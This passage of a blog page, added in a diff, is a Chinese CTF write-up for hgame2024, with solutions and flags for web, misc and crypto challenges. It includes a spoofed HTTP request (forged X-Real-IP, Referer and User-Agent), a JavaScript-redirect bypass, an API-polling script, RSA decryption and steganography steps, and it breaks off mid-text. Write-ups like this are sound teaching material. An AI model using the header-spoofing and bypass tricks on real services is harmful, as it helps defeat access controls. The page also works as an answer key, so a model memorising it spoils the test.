@@ -1,0 +1,762 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/url.jpg">
+  <link rel="icon" href="/img/url.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="J_0k3r">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="离时代远远 没人间烟火 毫无代价唱最幸福的歌 -《我的快乐时代》">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hgame2024">
+<meta property="og:url" content="http://example.com/2024/02/16/hgame2024/index.html">
+<meta property="og:site_name" content="J_0k3r">
+<meta property="og:description" content="离时代远远 没人间烟火 毫无代价唱最幸福的歌 -《我的快乐时代》">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/wdklsd.jpg">
+<meta property="article:published_time" content="2024-02-16T08:59:59.000Z">
+<meta property="article:modified_time" content="2024-02-16T14:08:22.971Z">
+<meta property="article:author" content="J_0k3r">
+<meta property="article:tag" content="比赛Write Up">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/wdklsd.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>hgame2024 - J_0k3r</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":180,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"python"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"41fc030db57d5570dd22f78997dc4a7e","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?41fc030db57d5570dd22f78997dc4a7e";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>J_0k3r的无人之境</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/wdklsd.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="hgame2024"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        J_0k3r
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-16 16:59" pubdate>
+          2024年2月16日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          16k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          132 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">hgame2024</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ezHTTP"><a href="#ezHTTP" class="headerlink" title="ezHTTP"></a>ezHTTP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">GET / HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">139.196</span><span class="hljs-number">.200</span><span class="hljs-number">.143</span>:<span class="hljs-number">32581</span><br>Cache-Control: <span class="hljs-built_in">max</span>-age=<span class="hljs-number">0</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>User-Agent:Mozilla/<span class="hljs-number">5.0</span> (Vidar; VidarOS x86_64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">121.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> Safari/<span class="hljs-number">537.36</span> Edg/<span class="hljs-number">121.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0.8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0.9</span><br>X-Real-IP:<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>Referer:vidar.club<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span><br>Connection: close<br></code></pre></td></tr></table></figure>
+<p>返回包</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJGMTRnIjoiaGdhbWV7SFRUUF8hc18xbVAwclQ0bnR9In0.VKMdRQllG61JTReFhmbcfIdq7MvJDncYpjaT7zttEDc<br></code></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a>decode<br><code>hgame&#123;HTTP_!s_1mP0rT4nt&#125;</code></p>
+<h3 id="Bypass-it"><a href="#Bypass-it" class="headerlink" title="Bypass it"></a>Bypass it</h3><p>访问注册时设置了js重定向<br>把浏览器js关掉注册登录即可<br>用<a target="_blank" rel="noopener" href="https://chromewebstore.google.com/detail/disable-javascript/jfpdlihdedhlmhlbgooailmfhahieoem?hl=zh-CN&utm_source=ext_sidebar">https://chromewebstore.google.com/detail/disable-javascript/jfpdlihdedhlmhlbgooailmfhahieoem?hl=zh-CN&amp;utm_source=ext_sidebar</a>Disable JavaScript 插件</p>
+<h3 id="Select-Courses"><a href="#Select-Courses" class="headerlink" title="Select Courses"></a>Select Courses</h3><p>选课时发送id到api，发现时不时会有课有空位，写脚本抢即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&#x27;http://47.100.245.185:31531/api/courses&#x27;</span><br>headers = &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>&#125;<br><br><span class="hljs-comment"># 循环发送ID 1-5</span><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>):  <span class="hljs-comment"># 发送ID 1-5</span><br>    data = <span class="hljs-string">&#x27;&#123;&quot;id&quot;:%d&#125;&#x27;</span> % <span class="hljs-built_in">id</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r = requests.post(url, data=data, headers=headers)<br>        <span class="hljs-comment"># 打印响应内容</span><br>        <span class="hljs-built_in">print</span>(r.text)<br>        time.sleep(<span class="hljs-number">2</span>)  <span class="hljs-comment"># 等待2秒</span><br><br>        <span class="hljs-comment"># 检查响应中是否包含&#x27;&quot;full&quot;:0&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&quot;full&quot;:0&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;&quot;full&quot;:1&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            <span class="hljs-keyword">continue</span><br><br></code></pre></td></tr></table></figure>
+<h3 id="2048-16"><a href="#2048-16" class="headerlink" title="2048*16"></a>2048*16</h3><p>在js里找到：<br><code>message</code> ：<code>ITMCnzbCn5eFIC=6yliXfzN=I5NMnz0XIC==yzycysi70ci7y7iK</code><br>和<code>game-won</code>表： <code>V+g5LpoEej/fy0nPNivz9SswHIhGaDOmU8CuXb72dB1xYMrZFRAl=QcTq6JkWK4t3</code><br><a target="_blank" rel="noopener" href="https://ctf.mzy0.com/CyberChef3/#recipe=From_Base64%EF%BC%88Base64%E8%BD%AC%E6%8D%A2%EF%BC%89('V%2Bg5LpoEej/fy0nPNivz9SswHIhGaDOmU8CuXb72dB1xYMrZFRAl%3DQcTq6JkWK4t3',true)&input=SVRNQ256YkNuNWVGSUM9NnlsaVhmek49STVOTW56MFhJQz09eXp5Y3lzaTcwY2k3eTdpSw">https://ctf.mzy0.com/CyberChef3/#recipe=From_Base64%EF%BC%88Base64%E8%BD%AC%E6%8D%A2%EF%BC%89(‘V%2Bg5LpoEej/fy0nPNivz9SswHIhGaDOmU8CuXb72dB1xYMrZFRAl%3DQcTq6JkWK4t3’,true)&amp;input=SVRNQ256YkNuNWVGSUM9NnlsaVhmek49STVOTW56MFhJQz09eXp5Y3lzaTcwY2k3eTdpSw</a><br><code>flag&#123;b99b820f-934d-44d4-93df-41361df7df2d&#125;</code></p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h3><p><code>hgame&#123;WOW_GREAT_YOU_SEE_IT_WONDERFUL&#125;</code></p>
+<h3 id="希儿希儿希尔"><a href="#希儿希儿希尔" class="headerlink" title="希儿希儿希尔"></a>希儿希儿希尔</h3><p>看题目猜到是希尔密码<br><img src="/mdimg/hgame2024/1706540285516-e66d2a3c-1e6d-46a7-b896-0479b54e2928.png" srcset="/img/loading.gif" lazyload><br>foremost分离<br><code>CVOCRJGMKLDJGBQIUIVXHEYLPNWR</code><br><img src="/mdimg/hgame2024/1706540334383-ccbb0fe8-459a-4192-9927-9153dfebefa8.png" srcset="/img/loading.gif" lazyload><br><code>hgame&#123;DISAPPEARINTHESEAOFBUTTERFLY&#125;</code></p>
+<h3 id="simple-attack"><a href="#simple-attack" class="headerlink" title="simple_attack"></a>simple_attack</h3><p><img src="/mdimg/hgame2024/1706779235517-a2cac9bf-acbb-4dc0-8445-8b7e1f96d9e6.png" srcset="/img/loading.gif" lazyload><br><a target="_blank" rel="noopener" href="https://tool.jisuapi.com/base642pic.html">https://tool.jisuapi.com/base642pic.html</a><br><code>**hgame&#123;s1mple_attack_for_zip&#125;**</code></p>
+<h3 id="来自星尘的问候"><a href="#来自星尘的问候" class="headerlink" title="来自星尘的问候"></a>来自星尘的问候</h3><p><img src="/mdimg/hgame2024/1706779553589-e6663d77-4fb4-4027-a45d-4c74b5ec02f9.png" srcset="/img/loading.gif" lazyload><br><img src="/mdimg/hgame2024/1706779423474-ba58678a-228f-4f88-a14e-b05129f41492.jpeg" srcset="/img/loading.gif" lazyload><br><a target="_blank" rel="noopener" href="https://my1l.github.io/Ctrl/CtrlAstr.html">https://my1l.github.io/Ctrl/CtrlAstr.html</a><br><code>**hgame&#123;welc0me!&#125;**</code></p>
+<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br>p = <span class="hljs-number">149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669</span><br>q = <span class="hljs-number">116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461</span><br>c = <span class="hljs-number">10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971</span><br><br>n=p*q<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>e=<span class="hljs-number">0x10001</span><br>d=gmpy2.invert(e,phi)<br><br>m= <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure>
+
+<h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><h2 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h2><h3 id="ek1ng-want-girlfriend"><a href="#ek1ng-want-girlfriend" class="headerlink" title="ek1ng_want_girlfriend"></a>ek1ng_want_girlfriend</h3><p>追踪 <code>tcp.stream eq 0</code><br>提取hexdump  jpg<br><code>hgame&#123;ek1ng_want_girlfriend_qq_761042182&#125;</code></p>
+<h3 id="ezWord"><a href="#ezWord" class="headerlink" title="ezWord"></a>ezWord</h3><p>改为zip<br><code>word\media</code><br><code>恭喜你找到了这些东西，现在你离flag只差解开这个新的压缩包，然后对压缩包里的东西进行两层解密就能获得flag了。压缩包的密码和我放在这的两张图片有关。</code><br><img src="/mdimg/hgame2024/1707214030998-68a51f73-b765-47fb-beb4-a0b1d326e3e8.png" srcset="/img/loading.gif" lazyload><br><img src="/mdimg/hgame2024/1707214045712-2d93a624-220c-4363-b79f-6fcf9dd3f700.png" srcset="/img/loading.gif" lazyload><br><code>T1hi3sI4sKey</code><br><code>你好，很高兴你看到了这个压缩包。请注意：这个压缩包的密码有11位数而且包含大写字母小写字母和数字。还有一个要注意的是，里面的这一堆英文decode之后看上去是一堆中文乱码实际上这是正常现象，如果看到它们那么你就离成功只差一步了。</code></p>
+<figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs tp">Dear E-Commerce professional ; This letter was specially<br>selected to be sent to you . We will comply with all<br>removal requests <span class="hljs-comment">! This mail is being sent in compliance</span><br><span class="hljs-comment">with Senate bill 1620 ;</span> Title <span class="hljs-number">3</span> ; Section <span class="hljs-number">308</span> <span class="hljs-comment">! This</span><br><span class="hljs-comment">is not a get rich scheme ! Why work for somebody else</span><br><span class="hljs-comment">when you can become rich in 27 MONTHS . Have you ever</span><br><span class="hljs-comment">noticed more people than ever are surfing the web and</span><br><span class="hljs-comment">more people than ever are surfing the web . Well, now</span><br><span class="hljs-comment">is your chance to capitalize on this ! WE will help</span><br><span class="hljs-comment">YOU use credit cards on your website plus turn your</span><br><span class="hljs-comment">business into an E-BUSINESS . You are guaranteed to</span><br><span class="hljs-comment">succeed because we take all the risk ! But don&#x27;t believe</span><br><span class="hljs-comment">us . Ms Simpson who resides in Maine tried us and says</span><br><span class="hljs-comment">&quot;I&#x27;ve been poor and I&#x27;ve been rich - rich is better&quot;</span><br><span class="hljs-comment">. We are a BBB member in good standing ! We urge you</span><br><span class="hljs-comment">to contact us today for your own future financial well-being</span><br><span class="hljs-comment">. Sign up a friend and you&#x27;ll get a discount of 50%</span><br><span class="hljs-comment">. Thank-you for your serious consideration of our offer</span><br><span class="hljs-comment">! Dear Friend ;</span> This letter was specially selected<br>to be sent to you <span class="hljs-comment">! We will comply with all removal</span><br><span class="hljs-comment">requests . This mail is being sent in compliance with</span><br><span class="hljs-comment">Senate bill 2316 ;</span> Title <span class="hljs-number">8</span> , Section <span class="hljs-number">301</span> <span class="hljs-comment">! Do NOT confuse</span><br><span class="hljs-comment">us with Internet scam artists . Why work for somebody</span><br><span class="hljs-comment">else when you can become rich as few as 24 WEEKS !</span><br><span class="hljs-comment">Have you ever noticed more people than ever are surfing</span><br><span class="hljs-comment">the web plus how many people you know are on the Internet</span><br><span class="hljs-comment">. Well, now is your chance to capitalize on this .</span><br><span class="hljs-comment">We will help you decrease perceived waiting time by</span><br><span class="hljs-comment">200% and turn your business into an E-BUSINESS . You</span><br><span class="hljs-comment">are guaranteed to succeed because we take all the risk</span><br><span class="hljs-comment">. But don&#x27;t believe us . Mrs Simpson of Illinois tried</span><br><span class="hljs-comment">us and says &quot;Now I&#x27;m rich many more things are possible&quot;</span><br><span class="hljs-comment">! We assure you that we operate within all applicable</span><br><span class="hljs-comment">laws ! Do not delay - order today . Sign up a friend</span><br><span class="hljs-comment">and your friend will be rich too . Warmest regards</span><br><span class="hljs-comment">! Dear Sir or Madam ;</span> Especially for you - this hot<br>information . We will comply with all removal requests<br><span class="hljs-comment">! This mail is being sent in compliance with Senate</span><br><span class="hljs-comment">bill 1916 ;</span> Title <span class="hljs-number">2</span> , Section <span class="hljs-number">301</span> <span class="hljs-comment">! THIS IS NOT MULTI-LEVEL</span><br><span class="hljs-comment">MARKETING ! Why work for somebody else when you can</span><br><span class="hljs-comment">become rich in 89 days . Have you ever noticed most</span><br><span class="hljs-comment">everyone has a cellphone plus most everyone has a cellphone</span><br><span class="hljs-comment">! Well, now is your chance to capitalize on this !</span><br><span class="hljs-comment">WE will help YOU sell more &amp; SELL MORE . You can begin</span><br><span class="hljs-comment">at absolutely no cost to you . But don&#x27;t believe us</span><br><span class="hljs-comment">. Mr Jones of Minnesota tried us and says &quot;I was skeptical</span><br><span class="hljs-comment">but it worked for me&quot; ! We assure you that we operate</span><br><span class="hljs-comment">within all applicable laws ! We beseech you - act now</span><br><span class="hljs-comment">. Sign up a friend and you&#x27;ll get a discount of 90%</span><br><span class="hljs-comment">. Thanks . Dear Cybercitizen ;</span> Your email address has<br>been submitted to us indicating your interest in our<br>newsletter . If you are not interested in our publications<br>and wish to be removed from our lists, simply do NOT<br>respond and ignore this mail <span class="hljs-comment">! This mail is being sent</span><br><span class="hljs-comment">in compliance with Senate bill 2016 , Title 2 , Section</span><br><span class="hljs-comment">304 . This is different than anything else you&#x27;ve seen</span><br><span class="hljs-comment">! Why work for somebody else when you can become rich</span><br><span class="hljs-comment">in 48 weeks ! Have you ever noticed more people than</span><br><span class="hljs-comment">ever are surfing the web plus people love convenience</span><br><span class="hljs-comment">! Well, now is your chance to capitalize on this .</span><br><span class="hljs-comment">WE will help YOU deliver goods right to the customer&#x27;s</span><br><span class="hljs-comment">doorstep &amp; turn your business into an E-BUSINESS .</span><br><span class="hljs-comment">You can begin at absolutely no cost to you . But don&#x27;t</span><br><span class="hljs-comment">believe us . Ms Anderson who resides in New York tried</span><br><span class="hljs-comment">us and says &quot;My only problem now is where to park all</span><br><span class="hljs-comment">my cars&quot; ! We are a BBB member in good standing . If</span><br><span class="hljs-comment">not for you then for your LOVED ONES - act now ! Sign</span><br><span class="hljs-comment">up a friend and you&#x27;ll get a discount of 20% ! God</span><br><span class="hljs-comment">Bless . Dear Colleague , Your email address has been</span><br><span class="hljs-comment">submitted to us indicating your interest in our publication</span><br><span class="hljs-comment">. If you no longer wish to receive our publications</span><br><span class="hljs-comment">simply reply with a Subject: of &quot;REMOVE&quot; and you will</span><br><span class="hljs-comment">immediately be removed from our mailing list . This</span><br><span class="hljs-comment">mail is being sent in compliance with Senate bill 2416</span><br><span class="hljs-comment">, Title 9 ;</span> Section <span class="hljs-number">308</span> <span class="hljs-comment">! This is NOT unsolicited bulk</span><br><span class="hljs-comment">mail . Why work for somebody else when you can become</span><br><span class="hljs-comment">rich within 24 MONTHS ! Have you ever noticed most</span><br><span class="hljs-comment">everyone has a cellphone and people love convenience</span><br><span class="hljs-comment">. Well, now is your chance to capitalize on this !</span><br><span class="hljs-comment">We will help you decrease perceived waiting time by</span><br><span class="hljs-comment">190% and sell more ! The best thing about our system</span><br><span class="hljs-comment">is that it is absolutely risk free for you ! But 